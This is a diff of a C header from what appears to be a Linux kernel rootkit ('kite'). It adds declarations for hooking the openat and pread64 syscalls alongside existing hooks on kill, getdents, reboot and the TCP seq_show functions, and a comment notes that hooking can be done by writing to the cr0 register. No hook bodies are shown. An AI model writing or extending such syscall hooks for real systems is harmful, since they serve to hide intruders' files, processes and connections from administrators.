@@ -1,6 +1,7 @@
 #ifndef KITE_HOOK
     #define KITE_HOOK
 #include "kite_init.h"
+
 #include <linux/sched.h>
 #include <linux/kprobes.h> // to probe kernel symbols
 #include <linux/ftrace.h>
@@ -17,19 +18,23 @@ So, even if it's not possible to optimize this particular probepoint, there'll b
 Hooking is also achievable with changing the cr0 register to disable memory protection make the memory writable
 */
 
-const int ACTIVE_HOOKS_SIZE = 8; /*Available number of hooks to store*/
+const int ACTIVE_HOOKS_SIZE = 10; /*Available number of hooks to store*/
 
 #ifdef PTREGS_SYSCALL_STUB
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions, can be long even for int ret*/
 ptregs_t orig_kill;
 ptregs_t orig_getdents64;
 ptregs_t orig_getdents;
 ptregs_t orig_reboot;
+ptregs_t orig_openat;
+static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
 #else
-static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+static asmlinkage int (*orig_kill)(pid_t pid, int sig);
 static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
 static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
 static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
+static asmlinkage int (*orig_openat)(int dfd, const char *filename, int flags, umode_t mode);
+static asmlinkage ssize_t (*orig_pread64)(unsigned int fd, char *buf, size_t count, loff_t pos);
 #endif
 static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
